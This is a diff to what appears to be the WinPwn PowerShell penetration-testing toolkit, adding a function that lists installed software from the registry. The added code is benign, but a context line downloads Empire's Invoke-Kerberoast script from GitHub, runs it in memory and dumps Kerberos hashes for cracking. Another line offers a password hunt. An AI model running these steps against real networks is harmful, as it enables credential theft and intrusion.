@@ -333,6 +333,7 @@ function localreconmodules
             netstat -ano >> "$currentPath\LocalRecon\ActiveConnections.txt"
             net share >> "$currentPath\LocalRecon\Networkshares.txt"
 	    wmic product get name,version >> "$currentPath\LocalRecon\InstalledSoftware.txt"
+	    Get-Installedsoftware -Property DisplayVersion,InstallDate >> "$currentPath\LocalRecon\InstalledSoftwareAll.txt"
             
             
             $passhunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
@@ -1032,6 +1033,145 @@ function kerberoasting
     Write-Host -ForegroundColor Yellow 'Starting Exploitation Phase:'
     Write-Host -ForegroundColor Red 'Kerberoasting active:'
     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'');Invoke-Kerberoast -OutputFormat Hashcat | fl >> .\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}'
+}
+
+Function Get-Installedsoftware {
+    [CmdletBinding(SupportsShouldProcess=$true)]
+    param(
+        [Parameter(ValueFromPipeline              =$true,
+                   ValueFromPipelineByPropertyName=$true,
+                   Position=0
+        )]
+        [string[]]
+            $ComputerName = $env:COMPUTERNAME,
+        [Parameter(Position=0)]
+        [string[]]
+            $Property,
+        [string[]]
+            $IncludeProgram,
+        [string[]]
+            $ExcludeProgram,
+        [switch]
+            $ProgramRegExMatch,
+        [switch]
+            $LastAccessTime,
+        [switch]
+            $ExcludeSimilar,
+        [int]
+            $SimilarWord
+    )
+
+    begin {
+        $RegistryLocation = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\',
+                            'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\'
+
+        if ($psversiontable.psversion.major -gt 2) {
+            $HashProperty = [ordered]@{}    
+        } else {
+            $HashProperty = @{}
+            $SelectProperty = @('ComputerName','ProgramName')
+            if ($Property) {
+                $SelectProperty += $Property
+            }
+            if ($LastAccessTime) {
+                $SelectProperty += 'LastAccessTime'
+            }
+        }
+    }
+
+    process {
+        foreach ($Computer in $ComputerName) {
+            try {
+                $socket = New-Object Net.Sockets.TcpClient($Computer, 445)
+                if ($socket.Connected) {
+                    $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Computer)
+                    $RegistryLocation | ForEach-Object {
+                        $CurrentReg = $_
+                        if ($RegBase) {
+                            $CurrentRegKey = $RegBase.OpenSubKey($CurrentReg)
+                            if ($CurrentRegKey) {
+                                $CurrentRegKey.GetSubKeyNames() | ForEach-Object {
+                                    $HashProperty.ComputerName = $Computer
+                                    $HashProperty.ProgramName = ($DisplayName = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('DisplayName'))
+                                    
+                                    if ($IncludeProgram) {
+                                        if ($ProgramRegExMatch) {
+                                            $IncludeProgram | ForEach-Object {
+                                                if ($DisplayName -notmatch $_) {
+                                                    $DisplayName = $null
+                                                }
+                                            }
+                                        } else {
+                                            $IncludeProgram | ForEach-Object {
+                                                if ($DisplayName -notlike $_) {
+                                                    $DisplayName = $null
+                                                }
+                                            }
+                                        }
+                                    }
+
+                                    if ($ExcludeProgram) {
+                                        if ($ProgramRegExMatch) {
+                                            $ExcludeProgram | ForEach-Object {
+                                                if ($DisplayName -match $_) {
+                                                    $DisplayName = $null
+                                                }
+                                            }
+                                        } else {
+                                            $ExcludeProgram | ForEach-Object {
+                                                if ($DisplayName -like $_) {
+                                                    $DisplayName = $null
+                                                }
+                                            }
+                                        }
+                                    }
+
+                                    if ($DisplayName) {
+                                        if ($Property) {
+                                            foreach ($CurrentProperty in $Property) {
+                                                $HashProperty.$CurrentProperty = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue($CurrentProperty)
+                                            }
+                                        }
+                                        if ($LastAccessTime) {
+                                            $InstallPath = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('InstallLocation') -replace '\\$',''
+                                            if ($InstallPath) {
+                                                $WmiSplat = @{
+                                                    ComputerName = $Computer
+                                                    Query        = $("ASSOCIATORS OF {Win32_Directory.Name='$InstallPath'} Where ResultClass = CIM_DataFile")
+                                                    ErrorAction  = 'SilentlyContinue'
+                                                }
+                                                $HashProperty.LastAccessTime = Get-WmiObject @WmiSplat |
+                                                    Where-Object {$_.Extension -eq 'exe' -and $_.LastAccessed} |
+                                                    Sort-Object -Property LastAccessed |
+                                                    Select-Object -Last 1 | ForEach-Object {
+                                                        $_.ConvertToDateTime($_.LastAccessed)
+                                                    }
+                                            } else {
+                                                $HashProperty.LastAccessTime = $null
+                                            }
+                                        }
+                                        
+                                        if ($psversiontable.psversion.major -gt 2) {
+                                            [pscustomobject]$HashProperty
+                                        } else {
+                                            New-Object -TypeName PSCustomObject -Property $HashProperty |
+                                            Select-Object -Property $SelectProperty
+                                        }
+                                    }
+                                    $socket.Close()
+                                }
+
+                            }
+
+                        }
+
+                    }
+                }
+            } catch {
+                Write-Error $_
+            }
+        }
+    }
 }
 
 function WinPwn
